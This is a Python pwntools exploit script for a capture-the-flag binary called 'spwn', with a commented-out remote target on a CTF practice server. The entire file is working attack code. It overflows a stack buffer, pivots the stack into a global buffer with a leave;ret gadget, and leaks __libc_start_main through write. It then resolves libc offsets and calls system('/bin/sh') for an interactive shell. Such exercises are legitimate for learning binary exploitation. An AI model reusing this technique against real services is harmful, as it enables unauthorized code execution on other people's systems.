#!/usr/bin/python3.6
from pwn import *
from LibcSearcher import LibcSearcher

filename = './spwn'
e = ELF(filename)
p = process(filename)
# p = remote("node3.buuoj.cn", 27104)

log.level = 'DEBUG'
for k, v in e.got.items():
    log.debug(f'got:{k}={hex(v)}')

def say(name, content):
    p.sendlineafter(b'name?', name)
    p.sendafter(b'to say?', content)

# TODO HINT:
# vul_function() leads to an ill-formed frame after __libc_start_main is leaked
ret_function = e.sym['main']
# TODO HINT:
# puts() can not be used here to leak GOT address. 
# Because it increases the top of stack greatly to reach a READ ONLY segment resulting in SIGSEGV
output_plt, c_func_got = e.plt['write'], e.got['__libc_start_main']
leave_ret = 0x08048511
ebp_offset = 0x18
global_buf = 0x804a300

payload_leave_ret = b'0'*ebp_offset + p32(global_buf) + p32(leave_ret)
say(p32(global_buf) + p32(output_plt) + p32(ret_function) + p32(1) + p32(c_func_got) + p32(4), payload_leave_ret)
c_func_addr = u32(p.recv(4))
log.success(f'__libc_start_main={hex(c_func_addr)}')

searcher = LibcSearcher(func='__libc_start_main', address=c_func_addr)
base_addr = c_func_addr - searcher.dump('__libc_start_main')
system_addr = base_addr + searcher.dump('system')
bin_sh_addr = base_addr + searcher.dump('str_bin_sh')
log.info(f'base={hex(base_addr)}, system={hex(system_addr)}, /bin/sh={hex(bin_sh_addr)}')


say(p32(global_buf) + p32(system_addr) + p32(ret_function) + p32(bin_sh_addr), payload_leave_ret)
p.interactive()
